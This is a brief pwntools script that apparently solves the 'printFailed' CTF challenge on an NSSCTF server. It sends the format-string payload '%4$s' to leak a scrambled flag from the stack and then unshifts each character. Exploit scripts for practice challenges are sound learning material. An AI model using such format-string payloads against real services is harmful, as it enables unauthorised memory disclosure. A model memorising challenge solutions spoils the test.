from pwn import *

#io = process("./printFailed")
io = remote("node4.anna.nssctf.cn", 27484)

io.recvuntil(b"scrambled flag?")
io.sendline(b"%4$s")
io.recv()
flag = io.recv().decode()
for i in range(len(flag)):
    print(chr(ord(flag[i])-1), end="")

io.interactive()
